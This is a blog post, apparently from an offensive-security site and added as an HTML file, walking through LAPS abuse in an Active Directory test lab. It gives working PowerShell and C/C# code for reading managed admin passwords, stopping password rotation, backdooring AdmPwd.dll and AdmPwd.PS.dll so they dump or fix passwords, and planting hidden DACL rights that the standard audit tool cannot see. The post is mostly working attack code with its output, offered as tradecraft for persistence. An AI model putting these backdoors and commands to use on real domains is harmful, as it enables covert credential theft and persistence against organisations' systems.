@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">LAPS - Part 2</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#retrieving-passwords-ez-mode">Retrieving Passwords EZ Mode</a>
+      <ul>
+        <li><a href="#admpwdps">AdmPwd.PS</a></li>
+        <li><a href="#powerview">PowerView</a></li>
+      </ul>
+    </li>
+    <li><a href="#persistence">Persistence</a>
+      <ul>
+        <li><a href="#expiration-time">Expiration Time</a></li>
+        <li><a href="#admpwddll">AdmPwd.dll</a></li>
+      </ul>
+    </li>
+    <li><a href="#admpwdpsdll">AdmPwd.PS.dll</a></li>
+    <li><a href="#acls">ACLs</a>
+      <ul>
+        <li><a href="#hidden-backdoors">Hidden Backdoors</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    <p>In <a href="/2018/03/laps---part-1/">Part 1</a> we explored how one could go about discovering and mapping the LAPS configuration in a domain.  In this part, we&rsquo;ll look at various ways LAPS can be abused for persistence purposes.</p>
+<h2 id="retrieving-passwords-ez-mode">Retrieving Passwords EZ Mode</h2>
+<h3 id="admpwdps">AdmPwd.PS</h3>
+<p>If you have access to a computer that has the LAPS PowerShell cmdlets installed, grabbing the password is very straight forward.</p>
+<pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : q+}W+83O
+ExpirationTimestamp : 16/04/2018 11:25:24
+</code></pre><p>This can also be done using PowerView.</p>
+<h3 id="powerview">PowerView</h3>
+<pre><code>PS H:\&gt; Get-DomainObject -Identity wkstn02 -Properties ms-mcs-admpwd
+
+ms-mcs-admpwd
+-------------
+q+}W+83O
+</code></pre><p><code>Get-DomainObject</code> also accepts a <code>-Credential</code> parameter.</p>
+<h2 id="persistence">Persistence</h2>
+<p>As part of the first time LAPS setup <code>Set-AdmPwdComputerSelfPermission</code> is run, which grants permissions for <code>NT AUTHORITY\SYSTEM</code> to update the <code>ms-mcs-admpwd</code> and <code>ms-mcs-admpwdexpirationtime</code> attributes on its own computer object.  Having <code>SYSTEM</code> access on a machine allows you to manually modify these attributes.</p>
+<h3 id="expiration-time">Expiration Time</h3>
+<p>When a computer runs <code>gpupdate</code>, it will check the <code>ms-mcs-admpwdexpirationtime</code> attribute - if that time has elapsed it will update the LAPS password and set a new expiration time.  By extending this time to some absurd value, you can ensure the password is never updated (unless forced with <code>Reset-AdmPwdPassword</code>).</p>
+<pre><code>PS H:\&gt; Get-DomainObject -Identity wkstn02 -Properties ms-mcs-admpwdexpirationtime
+
+ms-mcs-admpwdexpirationtime
+---------------------------
+         131678386982930135
+</code></pre><pre><code>PS C:\&gt; hostname; whoami
+wkstn02
+nt authority\system
+
+PS C:\&gt; Set-DomainObject -Identity wkstn02 -Set @{'ms-mcs-admpwdexpirationtime'='231678386982930135'} -Verbose
+</code></pre><pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : 0yNk}t4a
+ExpirationTimestamp : 01/03/2335 06:44:58
+</code></pre><h3 id="admpwddll">AdmPwd.dll</h3>
+<p>This DLL is used by the local computer to carry out all the LAPS functionality.  There is no integrity checking on this DLL, which means it can be replaced with a modified version.  The <a href="https://github.com/jformacek/admpwd">AdmPwd Project</a> source code can be used as a base for compiling our own.</p>
+<p>This is the portion of code that generates a new password and reports it to AD.</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">//it&#39;s time to change the password
+</span><span class="c1">//get local Administrator account we&#39;re managing password for
+</span><span class="c1"></span><span class="n">LogData</span><span class="p">.</span><span class="n">dwID</span> <span class="o">=</span> <span class="n">S_GET_ADMIN</span><span class="p">;</span>
+<span class="n">AdminAccount</span> <span class="nf">admin</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">AdminAccountName</span><span class="p">);</span>
+
+<span class="n">PasswordGenerator</span> <span class="nf">gen</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">PasswordComplexity</span><span class="p">,</span> <span class="n">config</span><span class="p">.</span><span class="n">PasswordLength</span><span class="p">);</span>
+<span class="n">TCHAR</span> <span class="o">*</span><span class="n">newPwd</span> <span class="o">=</span> <span class="n">gen</span><span class="p">.</span><span class="n">Generate</span><span class="p">();</span>
+			
+<span class="c1">//report new password and timestamp to AD
+</span><span class="c1"></span><span class="n">GetSystemTimeAsFileTime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">currentTime</span><span class="p">);</span>
+<span class="n">LogData</span><span class="p">.</span><span class="n">dwID</span> <span class="o">=</span> <span class="n">S_REPORT_PWD</span><span class="p">;</span>
+<span class="n">LogData</span><span class="p">.</span><span class="n">hr</span> <span class="o">=</span> <span class="n">comp</span><span class="p">.</span><span class="n">ReportPassword</span><span class="p">(</span><span class="n">newPwd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">currentTime</span><span class="p">,</span> <span class="n">config</span><span class="p">.</span><span class="n">PasswordAge</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">LogData</span><span class="p">.</span><span class="n">hr</span><span class="p">))</span>
+	<span class="n">throw</span> <span class="n">LogData</span><span class="p">.</span><span class="n">hr</span><span class="p">;</span>
+<span class="k">else</span>
+<span class="p">{</span>
+	<span class="n">LogData</span><span class="p">.</span><span class="n">dwID</span> <span class="o">=</span> <span class="n">S_REPORT_PWD_SUCCESS</span><span class="p">;</span>
+	<span class="n">LogAppEvent</span><span class="p">(</span><span class="o">&amp;</span><span class="n">LogData</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><h4 id="write-to-file">Write to File</h4>
+<p>In this example, I add a few lines to take the newly generated password and write it to <code>c:\backdoor.txt</code>.  This is just a re-creation of Maxime Clementz and Antoine Goichot&rsquo;s work, which can be found <a href="https://www.youtube.com/watch?v=opSctm4L8kE">here</a>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="n">LogData</span><span class="p">.</span><span class="n">hr</span> <span class="o">=</span> <span class="n">comp</span><span class="p">.</span><span class="n">ReportPassword</span><span class="p">(</span><span class="n">newPwd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">currentTime</span><span class="p">,</span> <span class="n">config</span><span class="p">.</span><span class="n">PasswordAge</span><span class="p">);</span>
+
+<span class="n">using</span> <span class="n">namespace</span> <span class="n">std</span><span class="p">;</span>
+<span class="n">wofstream</span> <span class="n">backdoor</span><span class="p">;</span>
+<span class="n">backdoor</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="s">&#34;c:</span><span class="se">\\</span><span class="s">backdoor.txt&#34;</span><span class="p">);</span>
+<span class="n">backdoor</span> <span class="o">&lt;&lt;</span> <span class="n">newPwd</span><span class="p">;</span>
+<span class="n">backdoor</span><span class="p">.</span><span class="n">close</span><span class="p">();</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS C:\&gt; gpupdate /target:computer /force
+
+PS C:\&gt; ls
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       13/03/2018     21:55                PerfLogs
+d-r---       10/03/2018     14:28                Program Files
+d-r---       16/07/2016     12:47                Program Files (x86)
+d-r---       11/03/2018     12:48                Users
+d-----       13/03/2018     21:55                Windows
+-a----       17/03/2018     10:47             12 backdoor.txt
+
+PS C:\&gt; cat .\backdoor.txt
+3s##5v2BS{70
+</code></pre></div><pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : 3s##5v2BS{70
+ExpirationTimestamp : 16/04/2018 11:47:59
+</code></pre><h4 id="static-password">Static Password</h4>
+<p>You could also force it to set a static password.</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">//TCHAR *newPwd = gen.Generate();
+</span><span class="c1"></span><span class="n">TCHAR</span> <span class="o">*</span><span class="n">newPwd</span> <span class="o">=</span> <span class="n">_T</span><span class="p">(</span><span class="s">&#34;Static Password!&#34;</span><span class="p">);</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : Static Password!
+ExpirationTimestamp : 16/04/2018 11:50:55
+</code></pre></div><p>Really, the skies the limit here.</p>
+<h2 id="admpwdpsdll">AdmPwd.PS.dll</h2>
+<p>The <code>AdmPwd.PS.dll</code> found in <code>C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS</code> can also be replaced.
+The following source is for the <code>Get-AdmPwdPassword</code> cmdlet.</p>
+<div class="highlight"><pre class="chroma"><code class="language-cs" data-lang="cs"><span class="na">[Cmdlet(&#34;Get&#34;, &#34;AdmPwdPassword&#34;)]</span>
+<span class="k">public</span> <span class="k">class</span> <span class="nc">GetPassword</span> <span class="p">:</span> <span class="n">Cmdlet</span>
+<span class="p">{</span>
+<span class="na">	[Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]</span>
+	<span class="k">public</span> <span class="n">String</span> <span class="n">ComputerName</span><span class="p">;</span>
+
+	<span class="k">protected</span> <span class="k">override</span> <span class="k">void</span> <span class="n">ProcessRecord</span><span class="p">()</span>
+	<span class="p">{</span>
+		<span class="k">foreach</span> <span class="p">(</span><span class="kt">string</span> <span class="n">dn</span> <span class="k">in</span> <span class="n">DirectoryUtils</span><span class="p">.</span><span class="n">GetComputerDN</span><span class="p">(</span><span class="n">ComputerName</span><span class="p">))</span>
+			<span class="p">{</span>
+				<span class="n">PasswordInfo</span> <span class="n">pi</span> <span class="p">=</span> <span class="n">DirectoryUtils</span><span class="p">.</span><span class="n">GetPasswordInfo</span><span class="p">(</span><span class="n">dn</span><span class="p">);</span>
+				<span class="n">WriteObject</span><span class="p">(</span><span class="n">pi</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+</code></pre></div><p>Here I add similar lines of code, where the password information is output to file after an administrator asks for it.  Again, you could do a lot more here - exfil them out over C2 for example.</p>
+<div class="highlight"><pre class="chroma"><code class="language-cs" data-lang="cs"><span class="na">[Cmdlet(&#34;Get&#34;, &#34;AdmPwdPassword&#34;)]</span>
+<span class="k">public</span> <span class="k">class</span> <span class="nc">GetPassword</span> <span class="p">:</span> <span class="n">Cmdlet</span>
+<span class="p">{</span>
+<span class="na">	[Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]</span>
+	<span class="k">public</span> <span class="n">String</span> <span class="n">ComputerName</span><span class="p">;</span>
+
+	<span class="k">protected</span> <span class="k">override</span> <span class="k">void</span> <span class="n">ProcessRecord</span><span class="p">()</span>
+	<span class="p">{</span>
+		<span class="k">foreach</span> <span class="p">(</span><span class="kt">string</span> <span class="n">dn</span> <span class="k">in</span> <span class="n">DirectoryUtils</span><span class="p">.</span><span class="n">GetComputerDN</span><span class="p">(</span><span class="n">ComputerName</span><span class="p">))</span>
+			<span class="p">{</span>
+				<span class="n">PasswordInfo</span> <span class="n">pi</span> <span class="p">=</span> <span class="n">DirectoryUtils</span><span class="p">.</span><span class="n">GetPasswordInfo</span><span class="p">(</span><span class="n">dn</span><span class="p">);</span>
+
+				<span class="kt">string</span><span class="p">[]</span> <span class="n">info</span> <span class="p">=</span> <span class="p">{</span> <span class="n">pi</span><span class="p">.</span><span class="n">DistinguishedName</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">Password</span><span class="p">,</span> <span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">ExpirationTimestamp</span><span class="p">).</span><span class="n">ToLongDateString</span><span class="p">()</span> <span class="p">+</span> <span class="s">&#34; &#34;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">ExpirationTimestamp</span><span class="p">).</span><span class="n">ToLongTimeString</span><span class="p">()</span> <span class="p">};</span>
+				<span class="kt">string</span> <span class="n">path</span> <span class="p">=</span> <span class="n">Environment</span><span class="p">.</span><span class="n">GetEnvironmentVariable</span><span class="p">(</span><span class="s">&#34;TEMP&#34;</span><span class="p">)</span> <span class="p">+</span> <span class="s">&#34;\\backdoor.txt&#34;</span><span class="p">;</span>
+				<span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="n">WriteAllLines</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">info</span><span class="p">);</span>
+
+				<span class="n">WriteObject</span><span class="p">(</span><span class="n">pi</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+</code></pre></div><pre><code>PS H:\&gt; ls $env:temp
+
+    Directory: C:\Users\jlpicard\AppData\Local\Temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       08/03/2018     21:26                Low
+d-----       17/03/2018     11:15                VirtualBox Dropped Files
+-a----       08/03/2018     21:37              0 Kno132E.tmp
+-a----       08/03/2018     21:39           1512 StructuredQuery.log
+-a----       08/03/2018     21:26            685 wmsetup.log
+</code></pre><pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : 35.6W5a.
+ExpirationTimestamp : 16/04/2018 12:18:56
+</code></pre><pre><code>PS H:\&gt; ls $env:temp
+
+    Directory: C:\Users\jlpicard\AppData\Local\Temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       08/03/2018     21:26                Low
+d-----       17/03/2018     11:15                VirtualBox Dropped Files
+-a----       17/03/2018     11:19             58 backdoor.txt
+-a----       08/03/2018     21:37              0 Kno132E.tmp
+-a----       08/03/2018     21:39           1512 StructuredQuery.log
+-a----       08/03/2018     21:26            685 wmsetup.log
+</code></pre><pre><code>PS H:\&gt; cat C:\Users\jlpicard\AppData\Local\Temp\backdoor.txt
+CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+35.6W5a.
+16 April 2018 12:18:56
+</code></pre><h2 id="acls">ACLs</h2>
+<p>Once you have something like domain admin, you can modify the principals that have the necessary extended rights over the LAPS attributes to read the passwords.  <code>Find-AdmPwdExtendedRights</code> is the default tool to see this information.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &#34;Workstations&#34; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre></div><p>You can also use the default <code>Set-AdmPwdReadPasswordPermission</code> tool to grant permission over an OU to a user/group.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Set-AdmPwdReadPasswordPermission -Identity &#34;Workstations&#34; -AllowedPrincipals &#34;LAB\rlaren&#34;
+
+Name                 DistinguishedName                                                 Status
+----                 -----------------                                                 ------
+Workstations         OU=Workstations,DC=testlab,DC=local                               Delegated
+</code></pre></div><p>The obvious downside, is that it will appear under <code>Find-AdmPwdExtendedRights</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &#34;Workstations&#34; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\rlaren, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre></div><h3 id="hidden-backdoors">Hidden Backdoors</h3>
+<p><a href="https://twitter.com/_wald0">Andy Robbins</a> and <a href="https://twitter.com/harmj0y">Will Schroeder</a> gave an excellent talk at Black Hat US-17 about <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors.pdf">DACL backdoors</a>, where they demonstrated (amongst others) that you can add these Extended Rights without <code>Find-AdmPwdExtendedRights</code> being able to see them.</p>
+<p>You can do this at the OU and individual Computer level.</p>
+<h4 id="ou">OU</h4>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; $Raw = Get-DomainOU -Raw Workstations
+PS H:\&gt; $Target = $Raw.GetDirectoryEntry()
+PS H:\&gt; $AdmPwdGUID = (Get-DomainGUIDMap).GetEnumerator() | ? { $_.value -eq &#39;ms-Mcs-AdmPwd&#39; } | select -ExpandProperty name
+PS H:\&gt; $ACE = New-ADObjectAccessControlEntry -InheritanceType Descendents -AccessControlType Allow -PrincipalIdentity rlaren -Right ExtendedRight -ObjectType $AdmPwdGUID
+PS H:\&gt; $Target.PsBase.ObjectSecurity.AddAccessRule($ACE)
+PS H:\&gt; $Target.PsBase.CommitChanges()
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &#34;Workstations&#34; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Get-AdmPwdPassword -ComputerName &#34;wkstn02&#34; | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : s;89}],Q
+ExpirationTimestamp : 16/04/2018 15:09:35
+</code></pre></div><h4 id="computer">Computer</h4>
+<pre><code>PS H:\&gt; $Raw = Get-DomainComputer -Identity wkstn01 -Raw
+</code></pre><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Get-AdmPwdPassword -ComputerName &#34;wkstn02&#34; | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            :
+ExpirationTimestamp : 16/04/2018 15:09:35
+
+PS H:\&gt; Get-AdmPwdPassword -ComputerName &#34;wkstn01&#34; | fl
+
+ComputerName        : WKSTN01
+DistinguishedName   : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+Password            : 1;/)2okP
+ExpirationTimestamp : 09/04/2018 15:46:17
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &#34;Workstations&#34; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>I hope this post gives you some ideas about how LAPS can be abused.  Please hit me up if you think I&rsquo;ve missed anything, or if you want to share any tricks that you may have.</p>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/laps-pt1/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/view-of-persistence/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
